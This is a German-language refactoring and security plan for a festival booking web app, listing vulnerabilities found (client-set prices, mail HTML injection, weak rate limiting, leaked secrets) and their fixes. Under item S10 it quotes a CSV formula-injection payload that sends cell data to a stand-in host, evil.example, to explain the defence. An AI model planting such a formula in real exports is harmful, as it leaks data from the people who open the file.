# Refactoring-Plan

Stand: 2026-11-18 · Ausgangspunkt: Tag `pre-refactoring-2026-11-18` (main @ `47fa876`)

Ziele: Code vereinfachen, Redundanzen beseitigen, schwache Architektur ersetzen, System absichern.

**Rücksprung**, falls etwas kaputtgeht:

```bash
git checkout pre-refactoring-2026-11-18          # Stand ansehen
git switch -c hotfix/<name> pre-refactoring-2026-11-18   # von dort aus weiterarbeiten
```

Reihenfolge: Phase 0 → Charakterisierungstests → Phase 1 + 3 parallel → Phase 4 → Phase 2.

## Branching und Release

Das Refactoring ergibt eine neue Version, die vor dem Produktiv-Deploy ausführlich getestet wird.
`main` deployt bei jedem Push automatisch – dort landet nur ein getesteter Release.

- [x] `develop` als Integrations-Branch angelegt (Stand von `refactoring/security-fixes`)
- [ ] Arbeits-Branches (`refactoring/…`, `feat/…`, `fix/…`) per PR nach `develop`; CI muss grün sein
- [ ] Branch-Schutz für `main` und `develop` (nur per PR, CI erforderlich, kein Force-Push)
- [ ] **Release-Test vor dem Merge nach `main`:**
  - Gesamt-Stack lokal mit Produktions-Images hinter der echten nginx-Konfiguration
  - Automatisierter Browser-Durchlauf (heute ein Wegwerf-Skript, siehe S6) als
    Playwright-Suite ins Repo übernehmen: User-/Artist-Anmeldung bis Absenden, Admin-Seiten,
    Profilseite, CSP-Verletzungen = Fehler
  - Datenmigration gegen eine Kopie der Produktions-DB testen (Phase 2 ändert das Schema)
  - Manuelle Checkliste für das, was nicht automatisiert ist (Mails, Zahlungslink, PWA/Offline)
  - Optional: Staging-Umgebung (zweiter Compose-Stack auf dem VPS oder lokal), wenn der Aufwand lohnt
- [ ] Vor dem Go-live: Secrets rotieren (siehe S5), Backup der Produktions-DB, Rollback-Plan
  (Image-Tags mit Commit-SHA, siehe Phase 4)

---

## Rahmenbedingungen (erledigt 2026-11-18)

Regeln und Prüfungen sind in `AGENTS.md` beschrieben und laufen in pre-commit und CI
(`.github/workflows/ci.yml`, Gate vor dem Deploy):

- [x] `ruff format` als einziger Formatter, Ruff-Regeln verschärft (`C90`, `TID`, `S608` nicht
  mehr global ignoriert, `max-args = 5`), Tool-Versionen gepinnt
- [x] import-linter: Schichten `api → services → models → utils`, kein Flask in Services/Models
- [x] Dateilängen-Check (`tools/check_file_length.py`) mit Ausnahmeliste
- [x] pre-commit repariert (aktuelle Versionen, Secrets-Baseline, Frontend-Hooks über `node_modules`)
- [x] `AGENTS.md` als einzige Quelle, `CLAUDE.md` importiert sie, `SETUP.md` in README aufgegangen

### Altlasten-Baseline – muss schrittweise auf null

Stand beim Einführen der Regeln. Darf nur sinken; wer eine betroffene Stelle anfasst, behebt sie mit.

| Baseline | Stand 2026-11-18 | Ort |
|---|---|---|
| Ruff-Verstöße | 107 Zeilen (`# noqa: …  # lint-baseline`) | `grep -rn lint-baseline server/` |
| Dateien > 300 Zeilen | 30 (16 Backend, 14 Frontend) | `tools/file_length_allowlist.txt` |
| import-linter-Ausnahmen | 1 (`app_settings_service → flask`) | `ignore_imports` in `server/pyproject.toml` |
| mypy-Fehler | 50 in 15 Dateien (CI noch nicht blockierend) | `cd server && mypy .` |
| Trivy-Ausnahmen | 1 (`DS-0002`: Container laufen als root → Phase 5) | `.trivyignore` |

- [ ] **Priorität:** die 33 `S608`-Stellen (SQL mit f-Strings) prüfen; Tabellen-/Spaltennamen
  müssen aus festen Allowlists kommen. Läuft mit B1 zusammen.
- [ ] mypy-Fehler beheben, danach mypy in CI und pre-commit blockierend schalten.
- [ ] Mit B1 `sqlite3` per Ruff `TID251` (banned-api) außerhalb von `src/db.py` verbieten.
- [ ] Service-zu-Service-Imports reduzieren (z. B. `admin_booking_mail_service` hängt an vier
  Services); ggf. später als import-linter-Vertrag absichern.
- [x] Frontend: alle Dateien Prettier-formatiert, `npm run quality` + Vitest laufen blockierend in CI.
- [ ] Frontend-Baseline: 1 ESLint-Ausnahme (`FAQManagementPage`, Funktion > 300 Zeilen,
  `// eslint-disable-next-line ... -- lint-baseline`) → beim Aufteilen der Seite entfernen.
- [ ] ESLint 8 mit CRA-Konfiguration (`react-app`) → auf ESLint 9 Flat Config umstellen.

---

## Phase 0 – Sicherheitslücken (sofort)

- [x] **S1 – Client bestimmt Preis und Zahlstatus.**
  `/api/submitForm` übernimmt das Request-JSON 1:1 (`Booking(**booking_data)`), `total_price`,
  `is_paid`, `paid_amount`, `payment_*` landen ungeprüft in der DB.
  Orte: `server/src/api/bookings.py` (submit_form), `server/src/services/booking_service.py` (create_booking).
  Maßnahme: nur erlaubte Felder annehmen, Preis serverseitig berechnen (wie im Artist-Pfad,
  `server/src/api/artist_bookings.py` → `_calculate_artist_total_price`), Zahlungsfelder auf Defaults setzen.

- [x] **S2 – HTML-Injection in Mails.**
  `first_name`, `last_name`, `supporter_buddy` u. a. werden unescaped in HTML-f-Strings eingesetzt.
  Ort: `server/src/services/mail_service.py` (Bestätigungs-, Artist- und Recovery-Mails).
  Maßnahme: sofort `html.escape()`, mittelfristig Jinja2 mit Autoescape (B5).

- [x] **S3 – Rollenprüfung 30+ Mal kopiert, per Identity-String.**
  `identity != "admin"` in fast jedem Admin-Endpunkt (`admin_faq.py` 10×, `shift_assignments.py` 10×, …).
  `/submitForm` akzeptiert jedes gültige Token, auch Artist-Tokens.
  Maßnahme: zentraler Decorator `@role_required(...)` auf Basis des `role`-Claims bzw.
  `before_request` je Admin-Blueprint.

- [x] **S4 – Rate-Limiting in Produktion praktisch aus.**
  `ENABLE_APP_RATE_LIMITING=false`; die Profil-Endpunkte (UUID = einziges Geheimnis) hängen nur am
  allgemeinen nginx-Limit (10 r/s). `get_client_ip()` vertraut dem ersten `X-Forwarded-For`-Eintrag (fälschbar).
  Orte: `server/src/utils/rate_limit.py`, `docker-compose.yml`, `deployment/nginx/wiesenwahn.conf`.
  Maßnahme: eigene nginx-Zonen für `/api/profile/` und schreibende Endpunkte; IP nur aus
  `request.remote_addr` nach `ProxyFix`.

- [ ] **S5 – Sensible Dateien im Git (Repository ist öffentlich).**
  - [x] `data/bookings.db`: war in der gesamten History leer; aus dem Index entfernt, `*.db` ignoriert
  - [x] `frontend/build/` (CRA-Reste) und `.github/artifacts/vulverability-report.csv` aus dem Index
    entfernt, `.github/artifacts/` ignoriert
  - [ ] **Vor dem nächsten Go-live:** Klartext-Passwort aus dem früheren `test/test_api.py` steht
    öffentlich in der History → alle drei Rollen-Passwörter rotieren (ein vor der Mindestlänge
    gesetzter Hash bleibt gültig). Über *Admin → Settings → Password*: neue GitHub-Secrets allein
    reichen nicht, Env-Werte werden nur übernommen, wenn für eine Rolle noch kein Hash existiert.
    Dabei auch `JWT_SECRET_KEY` und das Gmail-App-Passwort erneuern. History-Bereinigung danach optional.
  - [x] `dependabot-alert-export.yml` entfernt (lud die Alert-Liste als öffentlich abrufbares
    Workflow-Artefakt hoch; Alerts sind im Security-Tab sichtbar). Secret `GH_TOKEN` in den
    Repo-Settings löschen, falls es sonst nicht gebraucht wird.

- [x] **S6 – CSP und Formular-Entwürfe.**
  - [x] `Content-Security-Policy` im Host-nginx (Skripte nur `'self'`; `style-src 'unsafe-inline'`
    wegen MUI/Emotion), `X-Frame-Options: DENY`, veraltetes `X-XSS-Protection` entfernt
  - [x] Unterschrift wird nicht mehr im `localStorage`-Entwurf gespeichert (auch aus alten Entwürfen
    entfernt); nach einem Reload geht es höchstens bis zum Unterschrift-Schritt weiter
  - [x] Service Worker fasst fremde Origins nicht mehr an, Cache-Versionen erhöht
  - [x] Frontend: 403 (Token einer anderen Rolle) führt zum Login statt „Server nicht erreichbar“
  - Geprüft im lokalen Gesamt-Stack hinter nginx mit Headless-Chromium: alle Formularschritte
    (User + Artist), Admin-Login/Dashboard-Startseite, Profilseite → 0 CSP-Verletzungen.
    Admin-Unterseiten nicht einzeln durchgeklickt.
  - [ ] **Datenschutz:** Google Fonts werden von Google geladen (IP-Übertragung an Google; LG München
    2022 als DSGVO-Verstoß gewertet) → Schriften selbst hosten, danach CSP auf `'self'` verschärfen

- [ ] **S7 – Personendaten in Logs.** Bewusste Entscheidung für den Support (Nutzerprobleme
  nachvollziehen). Wird nicht einfach entfernt, sondern durch das Logging- und Support-Konzept
  (Phase L) ersetzt. Erst wenn das steht, werden Namen/E-Mails/UUIDs aus den Logs entfernt.

- [x] **S8 – Buchung nicht atomar.** Reguläre Buchung jetzt in einer Transaktion
  (`BEGIN IMMEDIATE`, Duplikat-Prüfung innerhalb des Locks); DB-Fehler führen zu 500 statt
  „Duplicate booking“. Artist-Pfad: Duplikat-Prüfung in die Transaktion verschoben.
  - [ ] `PRAGMA foreign_keys` ist nirgends aktiv → mit B1 einschalten (vorher Lösch-Reihenfolgen
    und Altdaten auf verwaiste Verweise prüfen).
  - [ ] **Produktfrage:** Ticket-Kontingente (`amount`) werden weder im Frontend noch im Backend
    durchgesetzt (nur Anzeige „max N“ bei Artists). Gewollt? Falls ja: Prüfung in der Transaktion.

- [ ] **S9 – Profil-Links (UUID als einziges Geheimnis).**
  Die UUID (v4, 122 Bit Zufall) ist nicht erratbar. Das Risiko ist, dass der Link nach außen gelangt:
  - Volle UUID im App-Request-Log (`log_request` loggt `request.path`) und im nginx-Access-Log
  - Profil-Antworten (E-Mail, Telefon, Zahlungsstatus) cacht der Service Worker
    (`frontend/public/service-worker.js`); kein `Cache-Control: no-store`
  - Links laufen nie ab und lassen sich nicht widerrufen; eine weitergeleitete Mail heißt Vollzugriff,
    inkl. schreibender Aktionen (Schichten annehmen/ablehnen, Mitfahr-Posts)
  - Keine eigene Rate-Limit-Zone für `/api/profile/` (siehe S4)
  - [x] `Cache-Control: no-store` für alle Profil-Antworten
  - [x] Eigene nginx-Rate-Limit-Zone für `/api/profile/` (S4)
  - [x] Admin-Hinweis: „Payment Notes“ sind für Teilnehmende im Profil sichtbar
  - [ ] UUID in Logs pseudonymisieren (Phase L)
  - [ ] Link-Rotation durch Admins (bei Verdacht auf Weitergabe), optional Ablauf nach dem Festival
  - [ ] Mittelfristig: Link → kurzlebiges Session-Token statt UUID in jeder API-URL
  - Bewusst beibehalten: Offline-Cache des Service Workers für Profildaten (schlechter Empfang auf
    dem Festival; Daten liegen nur auf dem Gerät der Person). Cache API ignoriert `no-store`.

- [x] **S10 – Formel-Injection im CSV-Export (zielt auf das Orga-Team).** Behoben über
  `frontend/src/utils/csvSafety.ts` für beide Exportwege (Dashboard und Schichtzuteilungen), mit Tests.
  Der Admin-Export (`react-csv` in `frontend/src/form/adminArea/Dashboard.tsx`,
  `frontend/src/form/adminArea/ShiftAssignments/utils/exportUtils.ts`) schreibt Eingaben der
  Teilnehmenden ungefiltert in CSV-Dateien (Name, E-Mail, Supporter-Buddy, Equipment, Sonderwünsche).
  Ein Wert wie `=HYPERLINK("https://evil.example?d="&B2;"Klick")` wird in Excel/LibreOffice zur Formel
  und kann Daten aus anderen Zellen abfließen lassen.
  Maßnahme: zentral für alle Exporte Werte mit `=`, `+`, `-`, `@`, Tab oder CR am Anfang mit `'`
  präfixen; Test dazu.
  (Zum Vergleich geprüft: `payment_notes` sind kein XSS-Einfallstor – nur Admins schreiben sie,
  React rendert sie als Text, im Frontend wird nirgends rohes HTML gerendert.)

### Voraussetzung: Charakterisierungstests

- [x] Testinfrastruktur (`server/test/conftest.py`): Flask-Test-Client, isolierte DB pro Test
  (über `DB_FILE_PATH`), Tokens je Rolle, abgefangener Mailversand; pytest läuft in `ci.yml`.
- [ ] Jeder Fix in Phase 0 bekommt zuerst einen Test, der die Lücke nachweist.
- [ ] Vor Phase 1: Tests für Buchung (user + artist), Auth, Admin-Zugriffsschutz
  (parametrisiert über alle Routen), Profil-Endpunkte, Admin-CRUD.

---

## Phase L – Logging- und Support-Konzept

**Zielkonflikt:** Datensparsam sein und trotzdem Nutzerprobleme schnell finden und reproduzieren.
Heute werden dafür Namen, E-Mails und UUIDs geloggt; im Frontend gibt es gar kein Logging.

**Grundidee:** Logs enthalten keine Klardaten, sind aber über Pseudonyme und Fehlercodes gezielt
einer Buchung zuordenbar, und zwar nur für Admins, die die Buchung ohnehin sehen dürfen.

- [ ] **Fehlercode für Nutzer.** Jede Antwort bekommt `X-Request-ID` (existiert schon als
  `g.request_id`, wird aber nicht zurückgegeben). Das Frontend zeigt bei Fehlern
  „Fehlercode: a1b2c3d4“. Nutzer schicken den Code mit → genau ein Log-Eintrag statt Suche nach Namen.
- [ ] **Pseudonyme statt Klardaten.** Statt Name/E-Mail/UUID wird `booking_id` bzw. ein kurzer
  HMAC der Profil-UUID (Server-Secret) geloggt. Im Admin-Bereich zeigt jede Buchung ihr Pseudonym
  → `grep` in den Logs findet alle Einträge dieser Person. Ohne Admin-Zugang sind Logs nicht zuordenbar.
- [ ] **Ereignis-Verlauf pro Buchung (Audit-Tabelle in der DB).** Fachliche Ereignisse wie
  „Buchung angelegt“, „Bestätigungsmail versendet/fehlgeschlagen“, „Schicht abgelehnt“,
  „Zahlung erfasst“, „Recovery-Mail angefordert“ landen in einer Tabelle und sind in der
  Admin-Buchungsansicht sichtbar. Löst die meisten Support-Fälle ohne Logs. Wird mit der Buchung gelöscht.
- [ ] **Frontend-Fehler erfassen.** Error-Boundary + `window.onerror`/`unhandledrejection` +
  zentraler Axios-Fehler-Handler (F1) senden an `POST /api/client-errors`: Fehlertyp, Meldung,
  Stacktrace, Route **ohne** UUID, App-Version, Request-ID, Browser grob. Keine Formulardaten.
  Rate-limitiert, Größe begrenzt, ohne Auth nutzbar. Selbst gebaut statt Sentry/GlitchTip
  (VPS mit 512 MB RAM; keine Daten an Dritte).
- [ ] **Strukturierte Logs.** JSON-Zeilen mit festen Feldern (`request_id`, `route`, `status`,
  `duration_ms`, `booking_ref`, `event`); erleichtert Suche und spätere Auswertung.
- [ ] **Aufbewahrung festlegen.** Heute rotieren Python (30 Tage) und logrotate (7 Tage)
  dieselben Dateien → auf einen Mechanismus reduzieren. Vorschlag: Anwendungs-Logs 14 Tage,
  Security-Events (pseudonym) 90 Tage, Debug-Logs in Produktion aus.
- [ ] **Danach:** Klardaten aus allen Log-Aufrufen entfernen (S7) und per Test absichern
  (Log-Ausgabe einer Buchung darf weder E-Mail noch Namen enthalten).

### Auswertung und Observability (zu entscheiden)

Heute werden Log-Dateien von Hand durchgesehen. Neben dem *Was wird geloggt* ist zu klären,
*wie* Logs ausgewertet werden und ob weitere Observability sinnvoll ist. Randbedingung: VPS mit
ca. 512 MB RAM und 10 GB Disk; App nutzt davon bereits ~512 MB als Limit.

Stufen (jede baut auf der vorherigen auf):

1. **Ohne zusätzliche Infrastruktur:** strukturierte JSON-Logs (Phase L) + `lnav` auf dem Server
   (SQL-Abfragen, Filter, Zeitachsen direkt auf Log-Dateien) bzw. `jq`. Dazu der Ereignis-Verlauf
   pro Buchung im Admin-Bereich. Deckt vermutlich die meisten Support-Fälle ab.
2. **Zentrale Log-Suche mit UI:** VictoriaLogs (ein Binary, sehr geringer Speicherbedarf, eigene
   Web-UI, Grafana-Plugin) oder Grafana Loki + Grafana (Industriestandard, aber mehr RAM).
   Auf dem 512-MB-VPS knapp → Optionen: VPS vergrößern, Stack nur bei Bedarf lokal betreiben
   (Logs per `rsync` holen), oder gehosteter Free-Tier (Datenschutz prüfen, nur pseudonyme Logs).
3. **Verfügbarkeit und Alarme:** externer Uptime-Check (z. B. Uptime Kuma, selbst gehostet, oder
   ein externer Dienst) + Benachrichtigung bei Ausfall/Deploy-Fehler. Geringer Aufwand, hoher Nutzen
   rund um das Festival.
4. **Metriken/Dashboards (Grafana + Prometheus/VictoriaMetrics):** für diese Last vermutlich
   Overkill; erst sinnvoll, wenn konkrete Fragen (Antwortzeiten, Fehlerraten) offen sind.

Nicht empfohlen: Splunk/ELK (Betrieb und RAM-Bedarf weit über dem VPS), Sentry selbst gehostet
(viele Dienste). Vorschlag: mit Stufe 1 + 3 starten, Stufe 2 nach dem nächsten Festival bewerten.

---

## Phase 1 – Backend-Fundament

- [ ] **B1 – Zentrale DB-Schicht.** (Teil erledigt: Pfadauflösung zentral in `src/utils/paths.py`)
  Pfad-Logik (`IN_DOCKER` → `DB_FILE_PATH`) und `_connect_db()` existieren in 11 Services + 4 Migrationen.
  → `src/db.py` mit `get_connection()` als Context Manager (row_factory, `foreign_keys=ON`, WAL,
  Commit/Rollback), Pfad aus der Config.

- [ ] **B2 – Ein Migrationssystem statt fünf.**
  Heute: `server/data/schema.sql`, `server/data/migrations/*.sql`, `server/src/migrations/*.py`,
  `server/src/scripts/migrate_*.py` und ~30 `CREATE TABLE IF NOT EXISTS`/`ALTER TABLE` zur Laufzeit in 9 Services.
  → versionierter Runner (`PRAGMA user_version` + nummerierte SQL-Dateien) beim Start; kein DDL in Request-Pfaden.

- [ ] **B3 – Endpunkt-Boilerplate abbauen.**
  `server/src/api/auth.py` enthält dieselbe Funktion 3× (nur Rolle verschieden). Fast jeder
  Endpunkt wiederholt try/except, Zeitmessung und Logging, obwohl `main.py` das zentral kann.
  → eine Route `/api/auth/<role>`; per-Endpoint-Fehlerbehandlung entfernen (geschätzt −30–40 % in `src/api/`).

- [ ] **B4 – Eingabevalidierung über Schemas** (Pydantic o. ä.). Löst S1 strukturell.
  Dabei Abhängigkeiten aufräumen: `flask-praetorian` (ungenutzt), `py-ts-interfaces` (ersetzen),
  `pytest` in die dev-Abhängigkeiten.

- [ ] **B5 – Mails über Templates.**
  `mail_service.py` (794 Zeilen) baut HTML in f-Strings, User/Artist fast doppelt → Jinja2 mit gemeinsamem Layout.

- [ ] **B6 – Dateien über dem 300-Zeilen-Limit aufteilen:**
  `formcontent_service.py` (898), `rideshare_service.py` (894), `profile_service.py` (743),
  `booking_service.py` (691), `news_service.py` (690), `option_service.py` (665), `artist_service.py` (631).

---

## Phase 2 – Architektur: User und Artist zusammenführen

Fast alles existiert doppelt:

- Tabellen: `Bookings`/`ArtistBookings`, `TicketOptions`/`ArtistTicketOptions`, Beverage, Food, Materials, Professions
- Services: `booking_service.py` / `artist_service.py`
- API: `bookings.py` / `artist_bookings.py`
- Mails, Frontend-Formulare, Admin-Seiten

Ziel: ein `Booking`-Modell mit `audience` ('regular' | 'artist') und optionalen Artist-Feldern
(Bandmitglieder als eigene Tabelle); Optionen ebenfalls mit `audience`.
Erfordert Datenmigration mit Backup → erst nach Phase 0/1 und mit Testabdeckung, außerhalb der Buchungssaison.

- [ ] Zielschema entwerfen und Migrationsskript schreiben
- [ ] Services/API zusammenführen
- [ ] Frontend und Admin auf das gemeinsame Modell umstellen

---

## Phase 3 – Frontend

- [ ] **F1 – Eine API-Schicht.**
  `services/apiClient.ts` (mit Interceptor) wird nur von 2 Dateien genutzt; 18 Dateien nutzen
  `axios` direkt, in 15 Dateien wird der `Bearer`-Header 54× manuell gesetzt.
  `services/api.ts` enthält Endpunkte, die es im Backend nicht gibt (`POST /api/booking`, `payment_received`).
  → alles über `apiClient`, 401 zentral → Logout, tote Endpunkte entfernen.

- [ ] **F2 – Auth-State vereinfachen.**
  `auth`, `isAdmin`, `token` in zwei Contexts; `isAdmin` geht beim Reload verloren.
  → ein `AuthContext`, Rolle und Ablaufzeit aus dem JWT.

- [ ] **F3 – Theme über Tokens statt Komponenten-Kopien.**
  Circus/Default/Space-Paare ≈ 2.900 Zeilen (`TicketOption*`, `SelectionOptionWithImage*`,
  `timeSlot*`, `*PanelLayout`, `*Background`) → eine Komponente je Element, Look aus dem Branding-Pack
  (`frontend/src/branding/`).

- [ ] **F4 – Artist-Formulare auf Basis-Komponenten.**
  Beispiel: `ArtistFoodSelectionForm.tsx` (160 Zeilen) baut nach, was `FoodSelectionForm.tsx`
  (29 Zeilen) über `FoodSelectionFormBase` erledigt. Ebenso Beverage, Ticket, Personal Details.

- [ ] **F5 – Offline/PWA-Sync bewerten.**
  `syncService.ts`, `utils/indexedDB.ts`, `SyncQueueManager` > 800 Zeilen. Nutzen prüfen, sonst entfernen.

- [ ] **F7 – Google Fonts selbst hosten (Datenschutz).** Heute lädt jeder Seitenaufruf Schriften
  von Google (IP-Übertragung, LG München 2022: DSGVO-Verstoß). Schriften als WOFF2 ins Bundle
  (z. B. `@fontsource/*`), `index.html` bereinigen, danach CSP `style-src`/`font-src` auf `'self'`.
- [ ] **F6 – Signature-Pads konsolidieren** (`SignaturePad.tsx` und `customSignaturePad.tsx`).

---

## Phase 4 – Betrieb und CI

- [x] **Lint-Gate vor Deploy** (`ci.yml`, von `deploy.yml` aufgerufen).
- [x] **Test-Gate vor Deploy:** pytest-Job in `ci.yml`.
- [ ] Actions in `deploy.yml` auf aktuelle Major-Versionen heben (Node-20-Deprecation;
  `ci.yml` ist bereits umgestellt). Erst nach einem Testlauf auf einem Branch.
- [ ] **Rollback-fähige Images.** Zusätzlich zum `:latest` mit Commit-SHA taggen.
- [ ] **nginx entdoppeln.** `frontend/nginx/default.conf` dupliziert Rate-Limit-Zonen und Auth-Routen des
  Host-nginx → Rate-Limiting nur im Host-nginx, Container-nginx liefert nur statische Dateien.
- [x] **Schwachstellen-Scans in CI** (Trivy, `ci.yml`, blockierend bei CRITICAL/HIGH mit Fix):
  - [x] `uv.lock` eingeführt; Images installieren exakt die gelockten, hash-geprüften Versionen
  - [x] `trivy fs` (Abhängigkeiten, Dockerfiles, Secrets) und `trivy image` (frisch gebaute Images)
  - [x] wöchentlicher Lauf; Trivy als Docker-Image per Digest gepinnt, Actions per SHA
  - [x] Dependabot (Actions, uv, npm, Docker), gruppiert
  - [x] Behoben: axios (12 CVEs), dompurify, form-data; OS-Updates beim Image-Build;
    Build-Stage `node:20` (EOL) → `node:24-alpine`; ungenutzte Abhängigkeiten entfernt
    (`flask-praetorian`, `requests`; `pytest` nur noch dev)
  - [x] `.dockerignore` für `server/` und `frontend/`: lokale Builds kopierten `.env`, die
    lokale DB und Unterschriften-PNGs ins Image
  - [ ] SARIF-Upload ins GitHub-Security-Tab (für private Repos nur mit GitHub Advanced Security)

- [x] **Doku aufräumen.** Veraltete Plan-/Session-Dokumente entfernt, `AGENTS.md`/`CLAUDE.md`/README aktualisiert.
- [ ] `ROADMAP.md`: offene Feature-Ideen in GitHub-Issues überführen, dann löschen.
- [ ] `VPS_SECURITY_HARDENING_CHECKLIST.md` (untracked) nach `deployment/` verschieben und einchecken.

---

## Phase 5 – Server und Deployment absichern

Vorhanden: `deployment/setup.sh` (ufw, unattended-upgrades, fail2ban, SSH nur per Key),
Container nur auf localhost, `no-new-privileges`, `cap_drop: ALL` (Backend). Offen:

- [ ] **Kein Root-Deploy.** CI deployt per SSH als `root` (`SERVER_USERNAME: root`), Root-Login ist
  erlaubt (`PermitRootLogin prohibit-password`). → eigener Deploy-User mit eng begrenztem `sudo`
  (nur Deploy-Skript, nginx-Reload), `PermitRootLogin no`, Deploy-Key mit `command=`-Restriktion.
  Hinweis: Mitgliedschaft in der `docker`-Gruppe entspricht faktisch Root.
- [ ] **nginx-Config nicht aus CI als Root schreiben.** Heute schreibt der Deploy-Job
  `/etc/nginx/...` und lädt nginx neu. → Config-Änderungen per Skript mit `nginx -t` und Rollback,
  ausgeführt vom eingeschränkten Deploy-User.
- [ ] **Container härten:** Backend-Dockerfile ohne `USER` (läuft als root) → eigener User;
  `read_only: true` + tmpfs; Frontend `cap_drop`; Base-Images pinnen (`node:20` ist veraltet → 22/24 LTS).
- [ ] **Images nachvollziehbar deployen:** Tag mit Commit-SHA (siehe Phase 4), optional per Digest
  deployen; GHCR-Pakete privat halten.
- [ ] **Secrets:** `.env` wird bei jedem Deploy aus GitHub-Secrets neu geschrieben (ok, `chmod 600`);
  Secrets rotieren (JWT-Secret, Rollen-Passwörter, Gmail-App-Passwort); GitHub-Environment
  `production` mit Required Reviewer für den Deploy.
- [ ] **Backups:** verschlüsselt und offsite, regelmäßiger Restore-Test.
- [ ] **Logs:** Aufbewahrung begrenzen (personenbezogene Daten), UUIDs/E-Mails maskieren (S7/S9).
- [ ] **Monitoring:** Uptime-Check, Alarm bei Deploy-Fehlern, fail2ban-Jail für 401/429 der API.
- [ ] `VPS_SECURITY_HARDENING_CHECKLIST.md` (44 offene Punkte) mit diesem Abschnitt abgleichen,
  nach `deployment/` verschieben und einchecken.

---

## Phase 6 – Serverumzug (IONOS → neuer Server)

Anlass: mehr RAM (heute ~512 MB, App nutzt fast alles), bessere Werkzeuge (Firewall, Snapshots,
API, stundengenaue Abrechnung) und ein sauberer Neuaufbau nach Phase 5. Der Server ist derzeit
offline, es gibt also keinen Zeitdruck.

**Idee:** Der neue Server dient zuerst als Staging für den Release-Test der neuen Version und wird
nach erfolgreichem Test zur Produktion. Der alte Server wird erst danach gekündigt.

### Entscheidung Anbieter
- [ ] Aktuellen IONOS-Vertrag prüfen: Tarif, Preis, Kündigungsfrist/Mindestlaufzeit, ob die Domains
  im Paket enthalten sind und ob weitere Dienste (z. B. Postfächer) daran hängen
- [ ] Vergleich (Stand 2026-11-18, inkl. MwSt.): Hetzner CX23 (2 vCPU, 4 GB, 40 GB) 7,13 €/Monat;
  IONOS VPS S+ (1 vCPU, 2 GB, 60 GB) ca. 5 € bzw. M+ (2 vCPU, 4 GB, 120 GB) ca. 12 € nach
  Aktionszeitraum, plus 10 € Einrichtung. Hetzner-Cloud-Tarife sind laut Website zeitweise
  „nicht bestellbar“ → Verfügbarkeit in der Console prüfen
- [ ] Standort in Deutschland (Falkenstein/Nürnberg), mind. 2 GB RAM, besser 4 GB
  (lässt Platz für Log-Auswertung aus Phase L)

### Neuen Server aufbauen (setzt Phase 5 um)
- [ ] Provisionierung reproduzierbar machen: `deployment/setup.sh` bzw. cloud-init überarbeiten,
  einmal auf dem neuen Server durchlaufen lassen (statt Handarbeit)
- [ ] Anbieter-Firewall (nur 22/80/443), SSH nur per Key, kein Root-Login, eigener Deploy-User
- [ ] Docker, Host-nginx (Konfiguration aus dem Repo), fail2ban, unattended-upgrades, Log-Rotation
- [ ] Backups: Snapshots beim Anbieter + verschlüsselte Offsite-Kopie der DB, Restore einmal testen
- [ ] Container als Non-root mit passenden Volume-Rechten (entfernt `DS-0002` aus `.trivyignore`)

### Daten und Umschaltung
- [ ] Release-Test der neuen Version auf dem neuen Server (siehe „Branching und Release“)
- [ ] DNS-TTL von `wiesenwahn.de` 24 h vorher auf 300 s senken
- [ ] App auf dem alten Server stoppen, konsistente DB-Kopie (`sqlite3 .backup`), auf den neuen
  Server übertragen, Migrationen ausführen, Stichproben prüfen
- [ ] A/AAAA-Einträge umstellen, TLS-Zertifikat per certbot auf dem neuen Server
- [ ] GitHub-Secrets für den Deploy aktualisieren (Host, Deploy-User, Key); Secrets bei der
  Gelegenheit rotieren (siehe S5)
- [ ] Rückfallplan: alter Server bleibt einige Tage startbereit, DNS kann zurückgestellt werden

### Domains (`wiesenwahn.de`, `hauptmann.online`)
- [ ] Für den Umzug reicht es, die DNS-Einträge bei IONOS auf die neue IP zu setzen –
  ein Domain-Transfer ist nicht nötig
- [ ] Optional später: Transfer zu einem eigenen Registrar (Auth-Code bei IONOS anfordern;
  `.online` hat nach Registrierung/Transfer 60 Tage Transfersperre; vorher abhängige Dienste
  wie Postfächer umziehen). Hetzner führt `.de`; `.online` dort nicht bestätigt
- [ ] Danach: alten Server und ggf. IONOS-Paket kündigen
